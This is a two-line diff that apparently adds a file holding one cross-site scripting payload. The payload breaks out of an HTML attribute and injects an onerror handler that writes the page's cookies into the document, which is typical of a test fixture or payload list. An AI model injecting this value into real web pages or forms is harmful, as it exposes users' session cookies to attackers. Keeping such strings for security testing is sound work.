@@ -1,0 +1,2 @@
+' onerror='document.write(document.cookie)
+
